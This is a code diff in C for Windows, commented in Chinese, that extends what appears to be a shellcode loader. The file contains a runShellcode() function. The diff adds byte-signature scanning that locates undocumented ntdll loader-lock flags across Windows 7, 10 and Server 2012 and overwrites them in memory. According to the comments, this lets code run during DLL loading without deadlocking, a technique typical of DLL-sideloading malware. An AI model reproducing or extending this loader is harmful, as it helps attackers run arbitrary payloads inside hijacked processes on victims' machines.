@@ -1,4 +1,5 @@
 ﻿#include <Windows.h>
+#include <stdio.h>
 
 void runShellcode() {
 #ifdef _WIN64
@@ -229,11 +230,26 @@ size_t GetSkipFileAPIBrokering(VOID)
 }
 
 #ifdef _WIN64
+//LdrFastFailInLoaderCallout导出函数开始匹配的特征码
 unsigned char lock_count_flag[] = { 0x66, 0x21, 0x88, 0xEE, 0x17, 0x00, 0x00 };
+//针对没有LdrFastFailInLoaderCallout导出函数的，全局特征码
 unsigned char win7_lock_count_flag[] = { 0xF0, 0x44, 0x0F, 0xB1, 0x35, 0xFF, 0xFF, 0xFF, 0xFF, 0x41 };
 #else
 unsigned char lock_count_flag[] = { 0x66, 0x21, 0x88, 0xCA, 0x0F, 0x00, 0x00, 0xE8 };
 unsigned char win7_lock_count_flag[] = { 0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0x8B, 0x75, 0xD8 };
+#endif
+
+#ifdef _WIN64
+//LdrGetDllFullName导出函数开始匹配的特征码，有两个是为了兼容不同版本系统
+unsigned char win10_staic_lock_flag1[] = { 0x48, 0x8B, 0x05, 0xFF, 0xFF, 0xFF, 0x00 };
+unsigned char win10_staic_lock_flag2[] = { 0x48, 0x8B, 0x1d, 0xFF, 0xFF, 0xFF, 0x00 };
+#else
+unsigned char win10_staic_lock_flag1[] = { 0x3b, 0x3d };
+#endif
+
+#ifdef _WIN32
+//上面的修改对server2012下32位程序还无法突破，需要额外解锁
+unsigned char server12_staic_lock_flag[] = { 0x64, 0x8B, 0x1D, 0x18, 0x00, 0x00, 0x00, 0x83, 0x65, 0xDC, 0x00, 0xBA };
 #endif
 
 VOID UNLOOK()
@@ -273,10 +289,9 @@ VOID UNLOOK()
     RtlLeaveCriticalSection((PRTL_CRITICAL_SECTION)Peb->LoaderLock);
 
     //上面代码是解决使用LoadLibrary动态加载DLL的死锁，下面代码是解决静态导入的DLL的死锁问题
-
-    //win7 和 08以上系统可以通过LdrFastFailInLoaderCallout导出函数定位到标记位地址
     size_t hookAddr = (size_t)GetProcAddress((HMODULE)hModule, "LdrFastFailInLoaderCallout");
     if (hookAddr > 0) {
+        //win7 和 08以上系统可以通过LdrFastFailInLoaderCallout导出函数定位到标记位地址
 #ifdef _WIN64
         hookAddr = hookAddr + 0x18 + 5 + *(PDWORD)(hookAddr + 0x18);
 #else
@@ -284,16 +299,47 @@ VOID UNLOOK()
 #endif
         * (PDWORD)hookAddr = 2;
     }
-    //win7 和 08以下系统没有LdrFastFailInLoaderCallout导出函数，需要搜索特征码定位到标记位地址
-    addr = memFind(textData, win7_lock_count_flag, (size_t)textData + rdataLength, sizeof(win7_lock_count_flag));
-    if (addr != 0)
-    {
+    else {
+        //win7 和 08以下系统没有LdrFastFailInLoaderCallout导出函数，需要搜索特征码定位到标记位地址
+        addr = memFind(textData, win7_lock_count_flag, (size_t)textData + rdataLength, sizeof(win7_lock_count_flag));
+        if (addr != 0)
+        {
 #ifdef _WIN64
-        hookAddr = addr + 0x5 + 4 + *(PDWORD)(addr + 0x5);
+            hookAddr = addr + 0x5 + 4 + *(PDWORD)(addr + 0x5);
 #else
-        hookAddr = *(PDWORD)((size_t)addr + 0x8);
+            hookAddr = *(PDWORD)((size_t)addr + 0x8);
 #endif
-        * (PDWORD)hookAddr = 2;
+            * (PDWORD)hookAddr = 2;
+        }
+    }
+
+    //系统有LdrGetDllFullName导出函数的，需要额外解锁EventMetadata，通过LdrGetDllFullName导出函数定位到标记位地址
+    hookAddr = (size_t)GetProcAddress((HMODULE)hModule, "LdrGetDllFullName");
+    if (hookAddr > 0) {
+#ifdef _WIN64
+        addr = memFind((BYTE*)hookAddr, win10_staic_lock_flag1, (size_t)hookAddr + 0x80, sizeof(win10_staic_lock_flag1));
+        addr = addr > 0 ? addr : memFind((BYTE*)hookAddr, win10_staic_lock_flag2, (size_t)hookAddr + 0x80, sizeof(win10_staic_lock_flag2));
+        if (addr != 0)
+        {
+            hookAddr = addr + 7 + *(PDWORD)(addr + 0x3);
+            *(size_t*)(*(size_t*)(*(size_t*)hookAddr + 0x98) + 0x38) += 2;
+        }
+#else
+        addr = memFind((BYTE*)hookAddr, win10_staic_lock_flag1, (size_t)hookAddr + 0x150, sizeof(win10_staic_lock_flag1));
+        if (addr != 0)
+        {
+            hookAddr = *(PDWORD)(addr + 0x2);
+            *(size_t*)(*(size_t*)(*(size_t*)hookAddr + 0x50) + 0x20) += 2;
+        }
+
+        //处理server2012特殊情况，解锁代码：mov ecx, offset dword_7710F74C inc eax，lock xadd [ecx], eax
+        addr = memFind((BYTE*)hookAddr, server12_staic_lock_flag, (size_t)textData + rdataLength, sizeof(server12_staic_lock_flag));
+        if (addr != 0)
+        {
+            hookAddr = *(PDWORD)(addr + sizeof(server12_staic_lock_flag));
+            *(PDWORD)hookAddr = 2;
+        }
+#endif
     }
 }
 
